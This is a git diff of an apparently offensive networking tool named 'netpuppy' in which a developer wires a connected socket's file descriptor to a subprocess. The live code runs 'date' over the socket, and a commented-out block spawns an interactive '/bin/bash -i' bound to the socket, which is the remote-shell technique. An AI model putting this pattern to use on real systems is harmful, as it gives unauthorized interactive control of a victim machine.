@@ -1,3 +1,9 @@
+# YOU ARE HERE:
+#  So the only issue is bottom window (listening process (we didn't give it a subprocess))
+# stdin not being input into the opened subprocess
+# maybe use rev instead of date
+
+
 from netpuppy.utils import banner, user_selection_update
 import argparse
 import socket
@@ -114,26 +120,26 @@ def main() -> None:
         if sub_proc is None:
             # make a subprocess to use for extracting target info
             try:
-                socket_file_np = current_connection.socket.fileno()
+                socket_file_no = current_connection.socket.fileno()
 
-                sub_proc = subprocess.Popen(
-                    ["whoami"],
-                    stdin=socket_file_np,
-                    stderr=socket_file_np,
-                    stdout=socket_file_np,
+                sub_proc = subprocess.call(
+                    [
+                        "/usr/bin/date",
+                    ],
+                    stdin=socket_file_no,
+                    stderr=socket_file_no,
+                    stdout=socket_file_no,
                 )
+            # sub_proc = subprocess.Popen(
+            #     ["/bin/bash", "-i"],
+            #     stdin=socket_file_no,
+            #     stderr=socket_file_no,
+            #     stdout=socket_file_no,
+            #     shell=True,
+            # )
 
-                # socket_file_np = connection.fileno
-
-                # output = sub_proc.PIPE
-            #                print(f"result = {output}")
             except Exception as err:
                 print(f"Exception in subproc try block: {err}")
-        #
-        #
-        ##
-        #
-        #
 
         # Update user:
         print(f"Connection established to: {current_connection.address} port {peer[1]}")
@@ -176,7 +182,7 @@ def main() -> None:
 #          Python: check for python on the system
 #               make a python shell
 #
-#
+# ""
 
 # BASH's JOB?
 #   - find bash
